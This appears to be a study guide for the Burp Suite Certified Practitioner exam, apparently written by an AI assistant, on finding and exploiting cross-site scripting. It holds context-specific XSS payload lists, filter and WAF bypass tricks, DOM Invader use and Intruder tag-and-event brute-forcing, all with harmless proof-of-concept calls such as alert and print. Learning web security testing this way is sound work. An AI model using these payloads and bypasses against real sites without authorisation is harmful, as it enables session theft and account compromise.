
# Basic Process

1. **Identify the reflection point.** You already feel solid here. The key is confirming it's actually reflected (or stored/DOM-based) and noting _where exactly_ the value lands in the response.
2. **Determine your context.** This is the step most people underestimate. The context dictates your entire approach:
	- Raw HTML body → you can inject tags directly
	- Inside an HTML attribute → you need to close the attribute and tag first
	- Inside a quoted JS string → you need to break out of the string with `'` or `"`
	- Inside a JS template literal → use `${}` syntax
	- Inside a `script` block but not in a string → no quotes needed, just valid JS

3. **Test for breaking out.** Send your canary characters (`"`, `'`, `<`, `>`, `` ` ``, `\`) and observe how they are handled in the response. Are they HTML-encoded? Stripped? Reflected raw? This tells you what you're working with.

4. **Handle encoding/filtering.** If characters are blocked or encoded, consider: HTML entities, JS escape sequences (`\u003c`), `javascript:` in `href`/`src`, and event handlers like `onerror`, `onload`, `onfocus` as alternatives to `<script>`.

5. **Construct and deliver your payload.** For the exam, the typical goal is `alert(document.cookie)` or `print()` — confirming JS execution rather than full exploitation.


# Determining Context
The workflow is simple: send your canary, then read the _raw source_ (not the rendered page) and ask "what is this string sitting inside?"

View source (`Ctrl+U`) or use Burp's response tab. Search for your canary string and look at the characters immediately surrounding it:

- Surrounded by normal HTML tags → **HTML body context**
- Inside a tag's attribute value, wrapped in `"` or `'` → **attribute context**
- Inside a `<script>` block, wrapped in quotes → **JS string context**
- Inside a `<script>` block, _not_ in quotes (e.g. assigned directly to a variable as a number/boolean) → **JS non-string context**
- Inside a `<script>` block with backticks → **JS template literal context**
- Inside an `href`, `src`, or `action` attribute → **URL attribute context**
- Only visible in JS via `location`, `document.URL`, etc. but not in the raw HTML → **DOM context**

## Highlights
**The `</script>` trick** is one people miss. If your canary lands inside a JS string and single quotes are encoded, you might think you're stuck. But browsers stop parsing a `<script>` block the moment they encounter `</script>` — even mid-string. So `</script><img src=x onerror=alert(1)>` can escape the script block entirely, even though you're "inside a JS string." The HTML parser takes priority.

**The backslash-escaping trick** is another one. If the server escapes your `'` to `\'` to prevent you breaking out of a JS string, but doesn't also escape backslashes, you can send `\'` yourself. The server turns it into `\\'` — the first backslash escapes the second, and your `'` is now free.

**On angle brackets being encoded** — yes, your understanding is exactly right. The server reflects `<` as the literal characters `&lt;` in the HTML, so the browser never sees it as a tag delimiter. It just renders as the `<` character visually, but there's no actual tag. That's why the fallback is to exploit whatever context y


## References 
### XSS context probes & payloads

### Step 1 — Universal probe (send this first, always)

```
canary"><'/`
```

View the raw response. Check which characters are reflected as-is vs. HTML-encoded.

- `<` reflected raw → tag injection likely viable
- `"` reflected raw → can break out of double-quoted attributes
- `'` reflected raw → can break out of single-quoted attributes
- `` ` `` reflected raw → may be usable in JS template literal context
- All encoded → you're limited to event handlers or JS string escapes

---

### HTML body context

Canary lands as: `<div>canary</div>`

```html
<script>alert(1)</script>
<img src=x onerror=alert(1)>
<svg onload=alert(1)>
<body onload=alert(1)>
<input autofocus onfocus=alert(1)>
<details open ontoggle=alert(1)>
```

If `script` keyword is blocked:

```html
<img src=x onerror=alert(1)>        <!-- no "script" needed -->
<svg/onload=alert(1)>
```

If angle brackets are encoded → context is effectively useless for tag injection; look elsewhere in the page.

---

### HTML attribute context (double-quoted)

Canary lands as: `<input value="canary">`

**Probe:** does `"` reflect raw or become `&quot;`?

If `"` is raw:

```
" onmouseover="alert(1)
" autofocus onfocus="alert(1)
" onblur="alert(1)" autofocus="
"><img src=x onerror=alert(1)>
"><svg onload=alert(1)>
```

If `"` is encoded but `'` is not:

```
' onmouseover='alert(1)
```

If both are encoded (all quotes encoded) → angle brackets may still work to break out of the tag entirely:

```
canary><svg onload=alert(1)>
```

---

### HTML attribute context (single-quoted)

Canary lands as: `<input value='canary'>`

```
' onmouseover='alert(1)
' autofocus onfocus='alert(1)
'><img src=x onerror=alert(1)>
```

---

### HTML attribute context (unquoted)

Canary lands as: `<input value=canary>`

Any whitespace breaks the attribute, so event handlers slot straight in:

```
canary onmouseover=alert(1)
canary onfocus=alert(1) autofocus
```

---

### JS string context (single-quoted)

Canary lands as: `var x = 'canary';`

**Probe:** does `'` reflect raw or become `\'` or `&#x27;`?

If `'` is raw:

```
'-alert(1)-'
';alert(1);//
'+alert(1)+'
```

If `'` is backslash-escaped (`\'`) but `\` is not escaped:

```
\';alert(1);//
```

(The `\` escapes the escape, freeing the `'`.)

If `'` is HTML-entity encoded (`&#x27;`) — angle brackets may still work to break out of the script block:

```
</script><img src=x onerror=alert(1)>
```

(Browsers stop parsing JS when they see `</script>` even mid-string.)

---

### JS string context (double-quoted)

Canary lands as: `var x = "canary";`

Same logic as single-quoted, swap `'` for `"`:

```
"-alert(1)-"
";alert(1);//
\";alert(1);//   (if " is escaped but \ isn't)
```

---

### JS template literal context

Canary lands as: ``var x = `canary`;``

No need to break out of quotes at all:

```
${alert(1)}
${alert`1`}
```

---

### href / src attribute (URL context)

Canary lands as: `<a href="canary">` or `<a href='canary'>`

Try `javascript:` URI if you control the whole value:

```
javascript:alert(1)
```

If the attribute is filtered for `javascript:`, try encoding:

```
javascript:alert(1)                  <!-- tab character before "alert" -->
&#106;avascript:alert(1)            <!-- HTML entity for j -->
```

Some filters check the start of the string, so:

```
JaVaScRiPt:alert(1)                  <!-- case variation -->
```

---

### DOM-based XSS

No raw reflection in HTML source. Data flows through JS.

Common sources: `location.search`, `location.hash`, `document.referrer`, `document.cookie` Common sinks: `innerHTML`, `document.write()`, `eval()`, `setTimeout(string)`, `location.href`

Use Burp's DOM Invader, or manually search JS files for the source variable being passed to a sink.

Payload depends on the sink:

```js
// innerHTML sink — no script tag, use event handler
<img src=x onerror=alert(1)>

// document.write sink — can inject full tags
<script>alert(1)</script>

// eval / setTimeout(string) sink — pure JS, no HTML needed
alert(1)

// location.href sink
javascript:alert(1)
```

---

### When angle brackets are encoded — JS-only payloads

If `<` and `>` both become `&lt;` and `&gt;`, tag injection is dead. But if you're in a JS or attribute context, you don't need them:

```js
// Inside a JS string — no angle brackets used at all
'-alert(1)-'
';alert(1);//

// Inside an attribute — no angle brackets, just break out of the quote
" onmouseover="alert(1)

// Template literal
${alert(1)}
```

---

### Filter bypass quick-reference

|Blocked|Try instead|
|---|---|
|`alert` keyword|`alert\`1``or`window'alert'`or`eval('al'+'ert(1)')`|
|`(` and `)`|`alert\`1`` (tagged template literal, no parens needed)|
|Spaces|`/` as separator: `<svg/onload=alert(1)>`|
|`onerror`|`onload`, `onfocus`, `onblur`, `ontoggle`, `onanimationend`, `onpointerover`|
|`script` keyword|Use event handlers on any tag instead|
|`javascript:`|HTML-encode the `j`: `&#106;avascript:alert(1)`|
|`"` and `'` (both)|Backtick in JS context; or break out of tag with `>` if unencoded|
# DOM Invader Guide

**The core workflow**
DOM Invader automatically injects a unique canary string into every possible source it can find — URL parameters, hash fragments, `postMessage` data, cookies, etc. — and then monitors whether that canary reaches any dangerous sink.

1. **Enable DOM Invader** in the tab and turn on "Inject canary into all sources"
2. **Interact with the page normally** — click links, submit forms, navigate. DOM Invader is watching in the background.
3. **Check the DOM Invader panel.** If the canary reached a sink, it shows you:
    - The **source** (e.g. `location.hash`)
    - The **sink** (e.g. `innerHTML`, `eval`, `document.write`)
    - The **stack trace** showing exactly how data flowed from one to the other
4. Click **"Exploit"** — DOM Invader auto-generates a payload appropriate for that specific sink and tests it for you.

---

**The postMessage feature**

This is especially useful for the BSCP exam. Some DOM XSS challenges involve a page that listens for `postMessage` events and passes the data into a sink. DOM Invader has a dedicated **postMessage** tab where it:

- Intercepts all `message` event listeners on the page
- Shows you what data they accept and how they process it
- Lets you craft and send test `postMessage` calls directly from the panel

If you see a `message` event listener in the DOM Invader panel, click into it to see the handler code, then use the built-in fuzzer to send payloads.

---

**What to pay attention to**

The sink type tells you what payload shape you need, which matches what's in the reference doc above. DOM Invader tells you the sink, so you don't have to hunt for it manually:

|Sink shown|Payload shape needed|
|---|---|
|`innerHTML`|`<img src=x onerror=alert(1)>`|
|`document.write`|`<script>alert(1)</script>`|
|`eval` / `setTimeout`|raw JS: `alert(1)`|
|`location.href`|`javascript:alert(1)`|
|`src` attribute|`javascript:alert(1)`|

---

**One gotcha**

DOM Invader works on the _rendered_ page in Burp's browser, so it catches things that Burp's passive scanner misses entirely — particularly JS frameworks that manipulate the DOM after page load (Angular, React, etc.). If a lab seems to have no obvious reflected XSS in the raw response but the page uses a JS framework, DOM Invader is the right tool to reach for first.

# Exam Specific Tips

A few tips specific to the BSCP exam:

**The exam favors `print()` over `alert()`** — Burp's lab grader specifically looks for `print()` being called in many reflected/stored XSS challenges, not `alert()`. Get into the habit.

**For DOM XSS**, the key discipline is tracing the _source_ (where attacker-controlled data enters JS, e.g. `location.hash`, `location.search`) to the _sink_ (where it causes execution, e.g. `innerHTML`, `eval`, `document.write`). The DOM Invader tool in Burp's browser makes this much faster.

**Angle brackets aren't everything** — a lot of candidates get stuck when `<>` are encoded. The JS string and attribute contexts don't need them at all; event handlers and `javascript:` URIs get you there without any tag injection.

**The encode-decode order matters** — if a value is URL-decoded before being placed in an attribute, you can sometimes bypass HTML encoding by URL-encoding your payload characters (`%22` for `"`).

# Cheat Sheet Tips
## What the Cheat Sheet Is

The [PortSwigger XSS cheat sheet](https://portswigger.net/web-security/cross-site-scripting/cheat-sheet) is a filterable list of:

- **Tags** (e.g. `<img>`, `<svg>`, `<body>`, custom tags like `<xss>`)
- **Events/attributes** (e.g. `onload`, `onerror`, `onfocus`)
- **Payloads** (the full working XSS vector combining a tag + event + JS)

The goal is to find which **tag** isn't blocked, then which **event** on that tag isn't blocked, and combine them into a working payload.

---

## The Brute-Force Tag Step — How It Actually Works

When a lab says "brute force all tags to find which gets a 200," here's the exact process:

**1. Get the tag list from the cheat sheet**

On the cheat sheet page, click **"Copy tags to clipboard"**. This gives you a list of tags, each formatted like:

```
<img>
<svg>
<body>
<xss>
...
```

**2. Send the search request to Burp Intruder**

The injection point is almost always the search box (or whatever field reflects input). In Burp, intercept a normal search request and send it to Intruder. It will look something like:

```
GET /?search=test HTTP/1.1
```

**3. Set the payload position correctly**

This is the part that trips people up. You don't just paste `<img>` into the field raw — you wrap the position marker **around where the tag goes** inside a basic XSS skeleton. Change the parameter to something like:

```
GET /?search=<§tag§> HTTP/1.1
```

The `§` marks are Intruder's payload position markers (added via the "Add §" button). So Intruder will substitute each tag in, producing requests like:

```
/?search=<img>
/?search=<svg>
/?search=<body>
```

**4. Paste the tag list as your payload list**

In Intruder → Payloads, select **Simple list** and paste the copied tags. Make sure URL encoding is **disabled** (otherwise `<` becomes `%3C` and the server sees it differently).

**5. Run and look for 200s**

Most tags will get a 400 or a filtered response. The one(s) returning **200** are not blocked by the WAF/filter.

---

## Then Brute-Force Events

Once you know an allowed tag (say `<body>`), you repeat the process for **events**. From the cheat sheet, filter by that tag and copy the events. Your Intruder position now looks like:

```
/?search=<body §event§=1>
```

Again, look for 200 responses. The allowed event becomes part of your final payload.

---

## Putting It Together

Say you found `<body>` is allowed and `onresize` is allowed. The cheat sheet gives you the full working vector:

```html
<body onresize="print()">
```

You'd then deliver that (often by making the victim resize the window, or via an iframe in the exploit server that triggers it automatically):

```html
<iframe src="https://TARGET/?search=<body onresize=print()>" onload="this.style.width='100px'">
```

---

## Key Things to Remember

- **URL encoding off** in Intruder payloads — you want raw angle brackets sent.
- The cheat sheet tags include the `<` and `>` — you don't add extra ones.
- The 200 vs non-200 distinction is about the app _reflecting_ your input normally vs. blocking/stripping it. A 200 doesn't mean XSS fired — it means the tag wasn't filtered, so it's a candidate.
- Some labs reflect input inside an existing tag (like `<input value="§here§">`), in which case you'd brute-force **attributes** rather than full tags — the setup is the same idea but the position changes.

Once this click for you mechanically, the cheat sheet becomes very fast to work with. Would you like a walkthrough of a specific lab type (e.g. reflected XSS with WAF, or stored XSS)?